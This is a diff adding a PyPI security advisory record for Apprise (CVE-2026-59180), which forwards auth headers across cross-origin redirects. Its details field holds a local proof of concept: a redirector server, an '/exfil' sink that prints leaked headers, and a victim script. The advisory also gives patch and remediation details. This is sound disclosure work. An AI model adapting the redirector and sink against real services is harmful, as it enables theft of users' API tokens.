@@ -1,0 +1,142 @@
+{
+  "id": "PYSEC-2026-4200",
+  "modified": "2026-10-15T14:45:07.014592420Z",
+  "published": "2026-10-15T10:22:55.198617Z",
+  "aliases": [
+    "CVE-2026-59180",
+    "GHSA-856c-92hv-3vxx"
+  ],
+  "summary": "Apprise forwards configured auth headers across cross-origin HTTP redirects",
+  "details": "# Summary\n\nApprise's HTTP-based notification plugins and its HTTP attachment / config loaders (`apprise/attachment/http.py`, `apprise/config/http.py`) follow HTTP 3xx redirects by default and **re-send the user-configured auth headers and query parameters on the redirected request**. If an operator-configured destination is later compromised (service takeover, malicious update), or an attacker holds a MITM position on an unprotected network path, that destination can return a `302 Location:` to an arbitrary host and Apprise forwards the user's secret (`X-Gotify-Key`, `Authorization`, bearer tokens in query, custom `+Header=` values) to that cross-origin host. The attacker does **not** need to control the original Apprise URL — only the response from a destination the operator already trusts.\n\nThis is the application-layer analogue of urllib3 [`GHSA-34jh-p97f-mpxf`](https://github.com/urllib3/urllib3/security/advisories/GHSA-34jh-p97f-mpxf) / `CVE-2026-44431` (\"`Proxy-Authorization` forwarded across cross-origin redirect\").\n\n# Affected versions\n\nAll releases up to and including `v1.10.0` (latest PyPI release as of filing, 2026-04-26). Fixed in v1.11.0 (released 2026-05-29), which includes [PR #1610](https://github.com/caronc/apprise/pull/1610) (merged 2026-05-16, commit 68c0aef218055e4586cf4605fd6b56358f5f462d).\n\n# Details\n\n`apprise/plugins/gotify.py` (pre-fix HEAD, lines 226-244, verbatim):\n\n```python\nheaders = {\n    \"User-Agent\": self.app_id,\n    \"Content-Type\": \"application/json\",\n    \"X-Gotify-Key\": self.token,    # user-supplied secret\n}\n...\nr = requests.post(\n    url,\n    data=dumps(payload),\n    headers=headers,\n    verify=self.verify_certificate,\n    timeout=self.request_timeout,\n    # NO allow_redirects=False -- requests default is True\n)\n```\n\n`requests` follows 3xx redirects by default and re-attaches the `headers=` dict on the redirected request, regardless of origin. The same shape exists across ~50 plugins (`custom_json`, `custom_xml`, `custom_form`, `gotify`, `ntfy`, `mattermost`, `apprise_api`, and most other HTTP-based plugins), plus in `apprise/attachment/http.py` and `apprise/config/http.py`.\n\n## Reproduction (local, safe)\n\n```python\n# attacker_redirector.py -- 127.0.0.1:8081 returns 302 to a cross-origin sink\nimport http.server\nclass H(http.server.BaseHTTPRequestHandler):\n    def do_POST(self):\n        self.send_response(302)\n        self.send_header(\"Location\", \"http://127.0.0.1:8082/exfil\")\n        self.end_headers()\nhttp.server.HTTPServer((\"127.0.0.1\", 8081), H).serve_forever()\n```\n\n```python\n# attacker_sink.py -- 127.0.0.1:8082 logs the leaked headers\nimport http.server\nclass H(http.server.BaseHTTPRequestHandler):\n    def do_POST(self):\n        print(\"LEAKED HEADERS:\", dict(self.headers))\n        self.send_response(204); self.end_headers()\nhttp.server.HTTPServer((\"127.0.0.1\", 8082), H).serve_forever()\n```\n\n```python\n# victim\nfrom apprise import Apprise\na = Apprise()\na.add(\"gotify://127.0.0.1:8081?token=SECRETTOKEN\")\na.notify(body=\"x\")\n```\n\nObserved on `master` HEAD (2026-05-13): `attacker_sink.py` prints `X-Gotify-Key: SECRETTOKEN` -- the user-supplied token followed the cross-origin redirect.\n\n# Patch\n\nFix landed in [`caronc/apprise#1610`](https://github.com/caronc/apprise/pull/1610) (merged 2026-05-16, commit `68c0aef`):\n\n- Adds `?redirect=yes|no` URL parameter on every plugin URL\n- Adds `AppriseAsset.http_redirects` global default\n- Equivalent flags wired into `apprise/attachment/http.py` and `apprise/config/http.py`\n\nThe default remains `redirects=True` for backwards compatibility -- operators who relay notifications through destinations they don't fully trust should append `?redirect=no` to their Apprise URLs or set `AppriseAsset(http_redirects=False)` globally.\n\nReleased in v1.11.0 (2026-05-29, available on PyPI).\n\nRelated:\n- Documentation: [`caronc/apprise-docs#60`](https://github.com/caronc/apprise-docs/pull/60) (merged 2026-05-16)\n- API counterpart: [`caronc/apprise-api#331`](https://github.com/caronc/apprise-api/pull/331) (merged 2026-05-29; shipped in apprise-api v1.5.1, built on Apprise v1.11.0)\n\n# Remediation\n\nUpgrade to Apprise v1.11.0 or later (`pip install -U apprise`).\n\nThe default remains `redirect=yes` for backwards compatibility, so after upgrading, operators who relay notifications through destinations they don't fully trust should also set `AppriseAsset(http_redirects=False)` globally or append `?redirect=no` to each plugin URL.\n\nIf you cannot upgrade yet, operate Apprise only against fully trusted notification destinations (the maintainer-documented supported model).\n\n# Classification\n\n- **CWE-200** Exposure of Sensitive Information to an Unauthorized Actor -- user's auth tokens / API keys / custom `+Header=` values are forwarded onto the cross-origin redirected request.\n- **CWE-601** URL Redirection to Untrusted Site -- a 3xx response from the initial (operator-configured) target sends the request and its credentials to a host the operator never configured.\n\nCVSS 3.1: `AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N` -\u003e **3.1 LOW**.\n\nAttack requires the operator-configured destination to be compromised or an attacker to be on the network path. Impact is partial confidentiality loss: a single user-supplied secret per redirected request, scoped to that one notification channel. This is intentionally a narrow redirect/header-forwarding hardening issue, not a claim that remote destinations or remote configuration are themselves vulnerabilities.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "apprise",
+        "purl": "pkg:pypi/apprise"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.11.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.0.1",
+        "0.0.2",
+        "0.0.3",
+        "0.0.4",
+        "0.0.5",
+        "0.0.6",
+        "0.0.7",
+        "0.0.8",
+        "0.0.9",
+        "0.5.0",
+        "0.5.2",
+        "0.7.3",
+        "0.7.4",
+        "0.7.5",
+        "0.7.6",
+        "0.7.7",
+        "0.7.8",
+        "0.7.9",
+        "0.8.0",
+        "0.8.1",
+        "0.8.2",
+        "0.8.3",
+        "0.8.4",
+        "0.8.5",
+        "0.8.6",
+        "0.8.7",
+        "0.8.8",
+        "0.8.9",
+        "0.9.0",
+        "0.9.1",
+        "0.9.2",
+        "0.9.3",
+        "0.9.4",
+        "0.9.5.1",
+        "0.9.6",
+        "0.9.7",
+        "0.9.8",
+        "0.9.8.1",
+        "0.9.8.2",
+        "0.9.8.3",
+        "0.9.9",
+        "1.0.0",
+        "1.1.0",
+        "1.10.0",
+        "1.2.0",
+        "1.2.1",
+        "1.3.0",
+        "1.4.0",
+        "1.4.5",
+        "1.5.0",
+        "1.6.0",
+        "1.7.0",
+        "1.7.1",
+        "1.7.2",
+        "1.7.3",
+        "1.7.4",
+        "1.7.5",
+        "1.7.6",
+        "1.8.0",
+        "1.8.1",
+        "1.9.0",
+        "1.9.1",
+        "1.9.2",
+        "1.9.3",
+        "1.9.4",
+        "1.9.5",
+        "1.9.6",
+        "1.9.7",
+        "1.9.8",
+        "1.9.9"
+      ],
+      "database_specific": {
+        "source": "https://github.com/pypa/advisory-database/blob/main/vulns/apprise/PYSEC-2026-4200.yaml"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/caronc/apprise/security/advisories/GHSA-856c-92hv-3vxx"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-59180"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/caronc/apprise/pull/1610"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/caronc/apprise/commit/68c0aef218055e4586cf4605fd6b56358f5f462d"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/caronc/apprise"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/caronc/apprise/releases/tag/v1.11.0"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://pypi.org/project/apprise"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/advisories/GHSA-856c-92hv-3vxx"
+    }
+  ]
+}
